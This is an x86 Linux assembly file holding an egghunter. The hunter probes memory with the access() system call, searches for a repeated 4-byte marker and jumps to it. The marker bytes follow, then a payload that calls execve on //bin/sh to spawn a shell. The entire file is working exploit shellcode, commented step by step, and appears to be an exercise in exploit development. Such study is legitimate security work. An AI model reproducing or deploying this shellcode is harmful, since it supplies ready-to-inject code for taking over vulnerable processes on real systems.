;  Access egghunter shellcode
 
global _start
section .text
_start:
    mov ebx,0x50905090
    xor ecx,ecx
    mul ecx

next_page:
    or dx,0xfff             ; page setup and alignment 

next_byte:
    inc edx
    pusha
    lea ebx,[edx+0x4]       
    mov al,0x21             ; access system call 
    int 0x80
    cmp al,0xf2             ; detect error code - memory unaccessible
    popa
    jz next_page
    cmp [edx],ebx           ; search for the 4 bytes of the egg
    jnz next_byte
    cmp [edx+0x4],ebx       
    jnz next_byte           ; didnt find second 4 bytes of egg
    jmp edx                 ; egg found
 
    ; Marker bytes, enables hunter code to find the start of the
    ; shellcode payload, must be executable code to work correctly.
    nop                     ; 0x90
    push eax                ; 0x50
    nop
    push eax
    nop
    push eax
    nop
    push eax
 
    xor eax,eax             ; zero-out eax 
    xor edx,edx             ; zero-out edx
    push edx                ; push a null
    push 0x68732f6e         ; push //bin/sh
    push 0x69622f2f         ; 
    mov ebx,esp             ; put current address stack in ebx
    push edx                ; push null
    push ebx                ; push address of //bin/sh
    mov ecx,esp             ; ecx pointer to //bin/sh
    push edx                ; push null
    mov edx,esp             ; edx contains pointer to null
    mov al,0xb              ; execve()
    int 0x80                ; 